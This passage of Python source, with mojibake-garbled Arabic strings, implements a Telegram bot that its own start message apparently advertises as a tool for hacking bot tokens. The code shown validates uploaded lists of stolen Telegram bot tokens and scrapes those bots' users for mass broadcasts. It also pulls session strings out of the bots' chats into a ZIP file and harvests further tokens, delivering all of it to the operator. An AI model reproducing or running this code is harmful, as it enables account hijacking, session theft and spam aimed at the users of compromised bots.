                                seen_tokens.add(token)
                                tokens['total'] += 1
                                tokens['details'].append({
                                    'token': token,
                                    'valid': False,
                                    'bot_info': {}
                                })
                except:
                    pass
                        
    except Exception as e:
        print(f"Error processing tokens chunk {start_id}-{end_id}: {e}")


async def main():
    # ØªÙ‡ÙŠØ¦Ø© Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
    await init_database()
    await cleanup_old_data()
    cleanup_sessions()

    session_name = os.path.join(SESSION_DIR, f"khalid_bot_{int(time.time())}")
    
    bot = TelegramClient(session_name, API_ID, API_HASH)
    
    # Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ø­Ø§Ù„Ø§Øª Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª ÙÙŠ Ø§Ù„Ø°Ø§ÙƒØ±Ø©
    stop_events = {}
    broadcast_messages = {}
    
    # Ø¯Ø§Ù„Ø© Ù…Ø³Ø§Ø¹Ø¯Ø© Ù„ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø¨Ø´ÙƒÙ„ Ø¢Ù…Ù†
    async def safe_edit_message(message, new_text, buttons=None):
        """
        ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¨Ø´ÙƒÙ„ Ø¢Ù…Ù† Ù…Ø¹ ØªØ¬Ù†Ø¨ Ø®Ø·Ø£ 'Content not modified'
        """
        try:
            # Ø§Ù„ØªØ­Ù‚Ù‚ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù†Øµ Ù…Ø®ØªÙ„Ù Ø¨Ø§Ù„ÙØ¹Ù„
            if hasattr(message, 'text') and message.text == new_text:
                return False
                
            await message.edit(new_text, buttons=buttons)
            return True
        except Exception as e:
            if "not modified" not in str(e).lower():
                print(f"âš ï¸ Ø®Ø·Ø£ ÙÙŠ ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ø±Ø³Ø§Ù„Ø©: {e}")
            return False
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        user_id = event.sender_id
        # Ù…Ø³Ø­ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ù† Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        await set_user_state(user_id, {'step': 'start'})
        await event.respond("ğŸ‰Ø¯Ø§ Ø¨ÙˆØª Ù‚Ø§Ø¯Ø± Ø¹ ØªÙ‡ÙƒÙŠØ± ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª ÙˆØ³Ø­Ø¨ Ø¬Ù…ÙŠØ¹ Ù…Ø­ØªØ¯Ø«Ø§Øª Ø§Ù„Ø¨ÙˆØª ÙˆØ±Ø³Ø§ÙŠÙ„Ù‡ğŸš€\n\n"
                          "ğŸ‘¨â€ğŸ’» Ø§Ù„Ù…Ø·ÙˆØ±: @Khalidd_sw\n\n"
                          "ğŸ“ Ø¹Ø´Ø§Ù† ØªØ³ØªØ®Ø¯Ù…Ù‡:\n"
                          "1ï¸âƒ£ Ø§ÙƒØªØ¨ /dump Ø¹Ø´Ø§Ù† Ù†Ø¨Ø¯Ø£ Ø³Ø­Ø¨ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„\n"
                          "2ï¸âƒ£ Ù‡ØªÙƒØªØ¨ ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª Ø§Ù„Ù„ÙŠ Ø¹Ø§ÙŠØ² ØªØ³Ø­Ø¨ Ù…Ù†Ù‡\n"
                          "3ï¸âƒ£ Ø¨Ø¹Ø¯ÙŠÙ† Ù‡ØªÙƒØªØ¨ ID Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø§Ù„Ù„ÙŠ Ø¹Ø§ÙŠØ² ØªÙ†Ù‚Ù„Ù„Ù‡\n"
                          "4ï¸âƒ£ Ù‡Ø¬ÙŠØ¨Ù„Ùƒ Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ Ø§Ù„Ù„ÙŠ Ù…ÙˆØ¬ÙˆØ¯Ù‡\n"
                          "5ï¸âƒ£ Ø§Ø®ØªØ§Ø± Ø§Ù†Øª Ø¹Ø§ÙŠØ² ØªÙ†Ù‚Ù„ Ù…Ù† ÙƒØ§Ù… Ù„ÙƒØ§Ù…")
                          
    @bot.on(events.NewMessage(pattern='/file'))
    async def file_handler(event):
	    user_id = event.sender_id
	    # Ø­ÙØ¸ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
	    await set_user_state(user_id, {'step': 'waiting_file'})
	    await event.respond("ğŸ“ Ø£Ø±Ø³Ù„ Ù„ÙŠ Ù…Ù„Ù txt ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…\n\n"
	                        "Ø³ÙŠØªÙ… Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù…Ù† Ø§Ù„Ù…Ù„Ù ÙˆØªØ­Ù„ÙŠÙ„Ù‡Ø§")

    @bot.on(events.NewMessage(func=lambda e: e.is_private and e.file))
    async def file_receiver_handler(event):
	    user_id = event.sender_id
	    user_state = await get_user_state(user_id)
	    
	    if user_state.get('step') != 'waiting_file':
	        return
	    
	    try:
	        # ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ù„Ù
	        file = await event.download_media(file=bytes)
	        text_content = file.decode('utf-8', errors='ignore')
	        
	        # Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù…Ù† Ø§Ù„Ù…Ù„Ù
	        tokens = TOKEN_PATTERN.findall(text_content)
	        unique_tokens = list(set(tokens))  # Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ØªÙƒØ±Ø§Ø±
	        
	        if not unique_tokens:
	            await event.respond("âŒ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙŠ ØªÙˆÙƒÙ†Ø§Øª ÙÙŠ Ø§Ù„Ù…Ù„Ù")
	            await set_user_state(user_id, {'step': 'start'})
	            return
	        
	        await event.respond(f"ğŸ” ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ {len(unique_tokens)} ØªÙˆÙƒÙ† ÙÙŠ Ø§Ù„Ù…Ù„Ù\nâ³ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„ØµØ§Ù„Ø­Ø©...")
	        
	        # Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
	        valid_tokens = []
	        total_tokens = len(unique_tokens)
	        
	        progress_msg = await event.respond(f"â³ Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0/{total_tokens} (0%)")
	        
	        last_update_time = 0
	        last_processed = 0
	        
	        async def update_token_progress(current, total):
	            nonlocal last_update_time, last_processed
	            current_time = time.time()
	            if current_time - last_update_time >= 3 or current == total:
	                last_update_time = current_time
	                percent = (current / total) * 100
	                new_text = f"â³ Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {current}/{total} ({percent:.1f}%)"
	                await safe_edit_message(progress_msg, new_text)
	            return True
	        
	        for i, token in enumerate(unique_tokens):
	            # ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ‚Ø¯Ù… ÙƒÙ„ 3 ØªÙˆÙƒÙ†Ø§Øª Ø£Ùˆ Ø¹Ù†Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡
	            if i % 3 == 0 or i == total_tokens - 1:
	                if not await update_token_progress(i + 1, total_tokens):
	                    break
	            
	            try:
	                validation_result = await validate_token(token)
	                if validation_result.get('valid', False):
	                    valid_tokens.append({
	                        'token': token,
	                        'bot_info': validation_result
	                    })
	            except Exception as e:
	                print(f"Error validating token {token}: {e}")
	                continue
	        
	        await progress_msg.delete()
	        
	        # Ø­ÙØ¸ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ÙÙŠ Ø­Ø§Ù„Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
	        user_state['file_tokens'] = valid_tokens
	        user_state['step'] = 'file_tokens_ready'
	        await set_user_state(user_id, user_state)
	        
	        # Ø¹Ø±Ø¶ Ø§Ù„Ù†ØªØ§Ø¦Ø¬ ÙˆØ§Ù„Ø£Ø²Ø±Ø§Ø±
	        buttons = [
	            [Button.inline("ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø© Ù„Ù„ÙƒÙ„", "file_broadcast")],
	            [Button.inline("ğŸ” Ø¨Ø­Ø« Ø¹Ù† Ø¬Ù„Ø³Ø§Øª", "file_sessions")],
	            [Button.inline("ğŸ”‘ Ø¨Ø­Ø« Ø¹Ù† ØªÙˆÙƒÙ†Ø§Øª", "file_tokens")]
	        ]
	        
	        await event.respond(
	            f"âœ… ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ {len(valid_tokens)} ØªÙˆÙƒÙ† ØµØ§Ù„Ø­ Ù…Ù† Ø£ØµÙ„ {len(unique_tokens)}\n\n"
	            "Ù…Ø§Ø°Ø§ ØªØ±ÙŠØ¯ Ø£Ù† ØªÙØ¹Ù„ØŸ",
	            buttons=buttons
	        )
	        
	    except Exception as e:
	        await event.respond(f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ù…Ù„Ù: {str(e)}")
	        await set_user_state(user_id, {'step': 'start'})


    @bot.on(events.CallbackQuery(pattern='file_'))
    async def file_buttons_handler(event):
	    user_id = event.sender_id
	    data = event.data.decode('utf-8')
	    
	    user_state = await get_user_state(user_id)
	    if user_state.get('step') != 'file_tokens_ready' or 'file_tokens' not in user_state:
	        await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª ØªÙˆÙƒÙ†Ø§Øª Ø¬Ø§Ù‡Ø²Ø©")
	        return
	    
	    valid_tokens = user_state['file_tokens']
	    
	    if data == 'file_broadcast':
	        await event.answer("ğŸ“Š Ø¨Ø¯Ø¡ Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ù…Ù† Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙˆØªØ§Øª...")
	        
	        stop_events[user_id] = asyncio.Event()
	        stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
	        
	        progress_msg = await event.edit("â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙˆØ¬Ù…Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0%", buttons=stop_button)
	        
	        all_users = set()
	        processed_bots = 0
	        total_bots = len(valid_tokens)
	        
	        last_update_time = 0
	        last_percent = -1
	        
	        async def update_broadcast_progress(current, total):
	            nonlocal last_update_time, last_percent
	            if user_id in stop_events and stop_events[user_id].is_set():
	                return False
	                
	            current_time = time.time()
	            current_percent = (current / total) * 100
	            
	            if (current_time - last_update_time >= 3 or 
	                abs(current_percent - last_percent) >= 5 or 
	                current == total):
	                
	                last_update_time = current_time
	                last_percent = current_percent
	                new_text = f"â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙˆØ¬Ù…Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {current}/{total} ({current_percent:.1f}%)"
	                await safe_edit_message(progress_msg, new_text, stop_button)
	            return True
	        
	        try:
	            for i, token_data in enumerate(valid_tokens):
	                if user_id in stop_events and stop_events[user_id].is_set():
	                    break
	                
	                token = token_data['token']
	                try:
	                    users = await extract_users_from_bot(token, user_id)
	                    all_users.update(users)
	                    processed_bots += 1
	                    
	                    if not await update_broadcast_progress(processed_bots, total_bots):
	                        break
	                        
	                except Exception as e:
	                    print(f"Error extracting users from token {token}: {e}")
	                    continue
	            
	            if user_id in stop_events:
	                del stop_events[user_id]
	            
	            if not all_users:
	                await progress_msg.edit("âŒ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙŠ Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†")
	                return
	            
	            user_list = list(all_users)
	            user_state['file_users_list'] = user_list
	            user_state['step'] = 'waiting_file_broadcast_message'
	            await set_user_state(user_id, user_state)
	            
	            await progress_msg.edit(
	                f"âœ… ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù€ {processed_bots} Ù…Ù† Ø£ØµÙ„ {total_bots} Ø¨ÙˆØª\n"
	                f"ğŸ‘¥ Ø¹Ø¯Ø¯ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {len(user_list)}\n\n"
	                f"ğŸ“ Ø£Ø±Ø³Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªÙŠ ØªØ±ÙŠØ¯ Ø¥Ø°Ø§Ø¹ØªÙ‡Ø§"
	            )
	            
	        except Exception as e:
	            if user_id in stop_events:
	                del stop_events[user_id]
	            await progress_msg.edit(f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {str(e)}")
	    
	    elif data == 'file_sessions':
	        await event.answer("ğŸ” Ø¨Ø¯Ø¡ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø¬Ù„Ø³Ø§Øª...")
	        
	        stop_events[user_id] = asyncio.Event()
	        stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
	        
	        progress_msg = await event.edit("â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¬Ù„Ø³Ø§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0%", buttons=stop_button)
	        
	        all_sessions = set()
	        processed_bots = 0
	        total_bots = len(valid_tokens)
	        
	        last_update_time = 0
	        last_percent = -1
	        
	        async def update_sessions_progress(current, total):
	            nonlocal last_update_time, last_percent
	            if user_id in stop_events and stop_events[user_id].is_set():
	                return False
	                
	            current_time = time.time()
	            current_percent = (current / total) * 100
	            
	            if (current_time - last_update_time >= 3 or 
	                abs(current_percent - last_percent) >= 5 or 
	                current == total):
	                
	                last_update_time = current_time
	                last_percent = current_percent
	                new_text = f"â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¬Ù„Ø³Ø§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {current}/{total} ({current_percent:.1f}%)"
	                await safe_edit_message(progress_msg, new_text, stop_button)
	            return True
	        
	        try:
	            for i, token_data in enumerate(valid_tokens):
	                if user_id in stop_events and stop_events[user_id].is_set():
	                    break
	                
	                token = token_data['token']
	                try:
	                    # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ù„Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„Ø¬Ù„Ø³Ø§Øª
	                    analysis = await analyze_bot_for_sessions_only(token, user_id)
	                    if analysis['success'] and analysis['sessions']['details']:
	                        for session in analysis['sessions']['details']:
	                            if 'session' in session:
	                                all_sessions.add(session['session'])
	                    
	                    processed_bots += 1
	                    
	                    if not await update_sessions_progress(processed_bots, total_bots):
	                        break
	                        
	                except Exception as e:
	                    print(f"Error analyzing sessions from token {token}: {e}")
	                    continue
	            
	            if user_id in stop_events:
	                del stop_events[user_id]
	            
	            # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù ZIP Ø¨Ø§Ù„Ø¬Ù„Ø³Ø§Øª
	            zip_buffer = io.BytesIO()
	            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
	                if all_sessions:
	                    sessions_text = "\n\n".join([f"Session {i+1}:\n{session}" for i, session in enumerate(all_sessions)])
	                    zip_file.writestr("sessions.txt", sessions_text)
	            
	            zip_buffer.seek(0)
	            
	            caption = (
	                f"ğŸ” Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø±Ø¬Ø©\n"
	                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¨ÙˆØªØ§Øª Ø§Ù„Ù…ÙØ­ÙˆØµØ©: {processed_bots}\n"
	                f"â€¢ Ø¹Ø¯Ø¯ Ø§Ù„Ø¬Ù„Ø³Ø§Øª Ø§Ù„Ù…ÙˆØ¬ÙˆØ¯Ø©: {len(all_sessions)}"
	            )
	            
	            await bot.send_file(
	                entity=user_id,
	                file=zip_buffer,
	                caption=caption,
	                attributes=[DocumentAttributeFilename("extracted_sessions.zip")]
	            )
	            
	            await progress_msg.delete()
	            await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ù„Ù Ø§Ù„Ø¬Ù„Ø³Ø§Øª")
	            
	        except Exception as e:
	            if user_id in stop_events:
	                del stop_events[user_id]
	            await progress_msg.edit(f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø¬Ù„Ø³Ø§Øª: {str(e)}")
	    
	    elif data == 'file_tokens':
	        await event.answer("ğŸ”‘ Ø¨Ø¯Ø¡ Ø§Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...")
	        
	        stop_events[user_id] = asyncio.Event()
	        stop_button = [[Button.inline("â¹ Ø¥ÙŠÙ‚Ø§Ù", "stop")]]
	        
	        progress_msg = await event.edit("â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: 0%", buttons=stop_button)
	        
	        all_found_tokens = []
	        processed_bots = 0
	        total_bots = len(valid_tokens)
	        
	        last_update_time = 0
	        last_percent = -1
	        
	        async def update_tokens_progress(current, total):
	            nonlocal last_update_time, last_percent
	            if user_id in stop_events and stop_events[user_id].is_set():
	                return False
	                
	            current_time = time.time()
	            current_percent = (current / total) * 100
	            
	            if (current_time - last_update_time >= 3 or 
	                abs(current_percent - last_percent) >= 5 or 
	                current == total):
	                
	                last_update_time = current_time
	                last_percent = current_percent
	                new_text = f"â³ Ø¬Ø§Ø±ÙŠ ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØªØ§Øª ÙˆØ§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...\nğŸ“Š Ø§Ù„ØªÙ‚Ø¯Ù…: {current}/{total} ({current_percent:.1f}%)"
	                await safe_edit_message(progress_msg, new_text, stop_button)
	            return True
	        
	        try:
	            for i, token_data in enumerate(valid_tokens):
	                if user_id in stop_events and stop_events[user_id].is_set():
	                    break
	                
	                token = token_data['token']
	                try:
	                    # ØªØ­Ù„ÙŠÙ„ Ø§Ù„Ø¨ÙˆØª Ù„Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª
	                    analysis = await analyze_bot_for_tokens_only(token, user_id)
	                    if analysis['success'] and analysis['tokens']['details']:
	                        for token_info in analysis['tokens']['details']:
	                            if token_info.get('valid', False):
	                                all_found_tokens.append({
	                                    'token': token_info['token'],
	                                    'bot_info': token_info.get('bot_info', {})
	                                })
	                    
	                    processed_bots += 1
	                    
	                    if not await update_tokens_progress(processed_bots, total_bots):
	                        break
	                        
	                except Exception as e:
	                    print(f"Error analyzing tokens from token {token}: {e}")
	                    continue
	            
	            if user_id in stop_events:
	                del stop_events[user_id]
	            
	            # Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ØªÙƒØ±Ø§Ø±
	            unique_tokens = []
	            seen_tokens = set()
	            for token_data in all_found_tokens:
	                if token_data['token'] not in seen_tokens:
	                    seen_tokens.add(token_data['token'])
	                    unique_tokens.append(token_data)
	            
	            user_state['file_found_tokens'] = unique_tokens
	            await set_user_state(user_id, user_state)
	            
	            buttons = [
	                [Button.inline("ğŸ“ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù†ØµÙŠØ§Ù‹", "send_tokens_text")],
	                [Button.inline("ğŸ“ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª ÙÙŠ Ù…Ù„Ù", "send_tokens_file")]
	            ]
	            
	            await progress_msg.edit(
	                f"âœ… ØªÙ… ÙØ­Øµ {processed_bots} Ù…Ù† Ø£ØµÙ„ {total_bots} Ø¨ÙˆØª\n"
	                f"ğŸ”‘ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ {len(unique_tokens)} ØªÙˆÙƒÙ† ØµØ§Ù„Ø­\n\n"
	                f"Ø§Ø®ØªØ± Ø·Ø±ÙŠÙ‚Ø© Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:",
	                buttons=buttons
	            )
	            
	        except Exception as e:
	            if user_id in stop_events:
	                del stop_events[user_id]
	            await progress_msg.edit(f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª: {str(e)}")
	            

    @bot.on(events.CallbackQuery(pattern='send_tokens_'))
    async def send_tokens_handler(event):
        user_id = event.sender_id
        data = event.data.decode('utf-8')
        
        user_state = await get_user_state(user_id)
        if 'file_found_tokens' not in user_state:
            await event.answer("âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ØªÙˆÙƒÙ†Ø§Øª Ø¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø¥Ø±Ø³Ø§Ù„")
            return
        
        tokens_data = user_state['file_found_tokens']
        
        if data == 'send_tokens_text':
            await event.answer("ğŸ“ Ø¨Ø¯Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ù†ØµÙŠØ§Ù‹...")
            
            for i, token_info in enumerate(tokens_data):
                token = token_info['token']
                bot_info = token_info.get('bot_info', {})
                
                message = (
                    f"{'-' * 40}\n"
                    f"ØªÙˆÙƒÙ† Ø±Ù‚Ù…: {i + 1}\n\n"
                    f"ğŸ‰ ØªÙˆÙƒÙ† Ø¨ÙˆØª ØµØ§Ù„Ø­ Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©!\n\n"
                    f"ğŸ” Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªÙˆÙƒÙ†:\n{token}\n\n"
                    f"ğŸ¤– Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª:\n"
                    f"â”œ Ø§Ù„Ø§Ø³Ù…: {bot_info.get('bot_name', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”œ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: @{bot_info.get('bot_username', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”œğŸ“©Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {bot_info.get('total_messages', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”œğŸ‘¤Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”” Ø§Ù„Ø¢ÙŠØ¯ÙŠ: {bot_info.get('bot_id', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"{'-' * 40}"
                )
                
                await event.respond(message)
                await asyncio.sleep(0.5)
            
            await event.answer(f"âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ {len(tokens_data)} ØªÙˆÙƒÙ†")
        
        elif data == 'send_tokens_file':
            await event.answer("ğŸ“ Ø¨Ø¯Ø¡ Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„Ù Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª...")
            
            # Ø¥Ù†Ø´Ø§Ø¡ Ù…Ø­ØªÙˆÙ‰ Ø§Ù„Ù…Ù„Ù
            file_content = ""
            for i, token_info in enumerate(tokens_data):
                token = token_info['token']
                bot_info = token_info.get('bot_info', {})
                
                file_content += (
                    f"{'-' * 40}\n"
                    f"ØªÙˆÙƒÙ† Ø±Ù‚Ù…: {i + 1}\n\n"
                    f"ğŸ‰ ØªÙˆÙƒÙ† Ø¨ÙˆØª ØµØ§Ù„Ø­ Ù…Ù† Ø§Ù„Ø´Ø¨ÙƒØ©!\n\n"
                    f"ğŸ” Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªÙˆÙƒÙ†:\n{token}\n\n"
                    f"ğŸ¤– Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨ÙˆØª:\n"
                    f"â”œ Ø§Ù„Ø§Ø³Ù…: {bot_info.get('bot_name', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”œ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: @{bot_info.get('bot_username', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”œğŸ“©Ø¹Ø¯Ø¯ Ø§Ù„Ø±Ø³Ø§Ø¦Ù„: {bot_info.get('total_messages', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”œğŸ‘¤Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"â”” Ø§Ù„Ø¢ÙŠØ¯ÙŠ: {bot_info.get('bot_id', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ†: {bot_info.get('total_users', 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ')}\n"
                    f"{'-' * 40}\n\n"
                )
            
            # Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ù…Ù„Ù
            filename = f"tokens_{int(time.time())}.txt"
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(file_content)
            
            await bot.send_file(
                entity=user_id,
                file=filename,
                caption=f"ğŸ”‘ Ù…Ù„Ù Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª Ø§Ù„Ù…Ø³ØªØ®Ø±Ø¬Ø©\nâ€¢ Ø¹Ø¯Ø¯ Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª: {len(tokens_data)}",
                attributes=[DocumentAttributeFilename("extracted_tokens.txt")]
            )
            
            try:
                os.remove(filename)
            except:
                pass
            
            await event.answer("âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ù…Ù„Ù Ø§Ù„ØªÙˆÙƒÙ†Ø§Øª")
            
    @bot.on(events.NewMessage(func=lambda e: e.is_private))
    async def file_broadcast_message_handler(event):
	    user_id = event.sender_id
	    user_state = await get_user_state(user_id)
	    
	    if user_state.get('step') != 'waiting_file_broadcast_message':
